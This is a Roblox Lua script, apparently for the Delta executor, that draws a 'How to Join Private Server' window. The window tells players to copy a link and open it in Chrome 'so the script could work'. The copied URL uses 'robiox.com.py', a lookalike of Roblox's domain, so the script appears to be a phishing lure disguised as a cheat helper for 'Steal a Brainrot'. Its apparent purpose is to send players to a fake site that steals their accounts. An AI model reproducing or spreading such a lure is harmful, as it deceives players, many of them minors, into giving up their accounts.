-- Delta Executor friendly Roblox UI script
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- Create ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "CodedServerGui"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 620, 0, 300)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BackgroundTransparency = 1
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 18)
corner.Parent = frame

-- Stroke
local stroke = Instance.new("UIStroke")
stroke.Thickness = 1.5
stroke.Color = Color3.fromRGB(90, 180, 90)
stroke.Parent = frame

-- Gradient
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(30,30,30)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(20,40,20))
}
gradient.Parent = frame

-- Close button
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 36, 0, 36)
closeButton.Position = UDim2.new(1, -46, 0, 10)
closeButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
closeButton.Text = "✕"
closeButton.TextColor3 = Color3.new(1,1,1)
closeButton.Font = Enum.Font.GothamBold
closeButton.TextSize = 22
closeButton.BorderSizePixel = 0
closeButton.Parent = frame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(1, 0)
closeCorner.Parent = closeButton

closeButton.MouseEnter:Connect(function()
	closeButton.BackgroundColor3 = Color3.fromRGB(220, 70, 70)
end)

closeButton.MouseLeave:Connect(function()
	closeButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
end)

closeButton.MouseButton1Click:Connect(function()
	frame:TweenSize(
		UDim2.new(0, 0, 0, 0),
		Enum.EasingDirection.In,
		Enum.EasingStyle.Quad,
		0.25,
		true,
		function()
			gui:Destroy()
		end
	)
end)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 45)
title.Position = UDim2.new(0, 10, 0, 12)
title.BackgroundTransparency = 1
title.Text = "How to Join Private Server"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 30
title.Parent = frame

-- Instructions
local instructions = Instance.new("TextLabel")
instructions.Size = UDim2.new(1, -40, 0, 170)
instructions.Position = UDim2.new(0, 20, 0, 65)
instructions.BackgroundTransparency = 1
instructions.Text = [[
Join private server so the script could work

1. Click Copy Link
2. Enter the link in Chrome
3. Click Play
4. Enjoy
]]
instructions.TextColor3 = Color3.fromRGB(180, 180, 180)
instructions.Font = Enum.Font.Gotham
instructions.TextSize = 18
instructions.TextWrapped = true
instructions.TextYAlignment = Enum.TextYAlignment.Top
instructions.Parent = frame

-- Copy Link Button
local copyButton = Instance.new("TextButton")
copyButton.Size = UDim2.new(0, 240, 0, 60)
copyButton.Position = UDim2.new(0.5, 0, 0.88, 0)
copyButton.AnchorPoint = Vector2.new(0.5, 0.5)
copyButton.BackgroundColor3 = Color3.fromRGB(76, 153, 42)
copyButton.BorderSizePixel = 0
copyButton.Text = "Copy Link"
copyButton.TextColor3 = Color3.new(1,1,1)
copyButton.Font = Enum.Font.GothamBold
copyButton.TextSize = 28
copyButton.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = copyButton

-- Hover effect
copyButton.MouseEnter:Connect(function()
	TweenService:Create(copyButton, TweenInfo.new(0.15), {
		BackgroundColor3 = Color3.fromRGB(95, 185, 55)
	}):Play()
end)

copyButton.MouseLeave:Connect(function()
	TweenService:Create(copyButton, TweenInfo.new(0.15), {
		BackgroundColor3 = Color3.fromRGB(76, 153, 42)
	}):Play()
end)

-- Copied text
local copiedText = Instance.new("TextLabel")
copiedText.Size = UDim2.new(0, 170, 0, 40)
copiedText.Position = UDim2.new(0.5, 0, 0.73, 0)
copiedText.AnchorPoint = Vector2.new(0.5, 0.5)
copiedText.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
copiedText.Text = "Copied Link!"
copiedText.TextColor3 = Color3.fromRGB(90, 200, 90)
copiedText.Font = Enum.Font.GothamBold
copiedText.TextSize = 22
copiedText.Visible = false
copiedText.Parent = frame

local copiedCorner = Instance.new("UICorner")
copiedCorner.CornerRadius = UDim.new(0, 6)
copiedCorner.Parent = copiedText

-- Fade in animation
TweenService:Create(
	frame,
	TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
	{BackgroundTransparency = 0.05}
):Play()

-- 🔗 UPDATED LINK (Steal a Brainrot)
local copyLink = "https://www.robiox.com.py/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=922229853177278515587676283755"

-- Copy logic
copyButton.MouseButton1Click:Connect(function()
	if setclipboard then
		setclipboard(copyLink)
		copiedText.Visible = true
		task.delay(2, function()
			copiedText.Visible = false
		end)
	end
end)
